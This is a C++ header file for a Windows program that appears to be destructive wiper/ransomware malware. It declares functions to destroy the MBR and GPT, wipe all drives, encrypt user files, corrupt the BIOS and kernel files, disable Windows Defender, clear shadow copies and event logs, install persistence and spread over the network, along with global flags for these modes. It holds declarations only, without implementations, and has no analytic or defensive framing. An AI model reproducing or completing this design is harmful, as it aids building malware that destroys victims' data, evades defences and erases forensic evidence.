#pragma once

#include <Windows.h>
#include <string>
#include <vector>

// Function declarations
BOOL IsRunAsAdmin();
void DestroyMBR();
void DestroyGPT();
void DestroyRegistry();
void DisableCtrlAltDel();
void SetCriticalProcess();
void BreakTaskManager();
void KillCriticalProcesses();
void ClearEventLogs();
void ClearShadowCopies();
void WipeRemovableMedia();
void CorruptBootFiles();
void CorruptKernelFiles();
void DisableWindowsDefender();
void SetCustomBootFailure();
void WipeAllDrives();
void EncryptUserFiles();
void CorruptBIOS();
void PropagateNetwork();
void ExecuteDestructiveActions();
void InstallPersistence();
void DisableSystemTools();
void CorruptSystemFiles();
void TriggerBSOD();
void RunBackgroundProcess();
BOOL IsWindows64();

// Global variables
extern bool criticalMode;
extern DWORD bsodTriggerTime;
extern bool persistenceInstalled;
extern bool disableTaskManager;
extern bool disableRegistryTools;
extern bool fileCorruptionActive;
extern bool processKillerActive;
extern bool g_isAdmin;
extern bool destructiveActionsTriggered;
extern bool networkPropagationActive;
extern bool encryptionActive;
extern bool biosCorruptionActive;
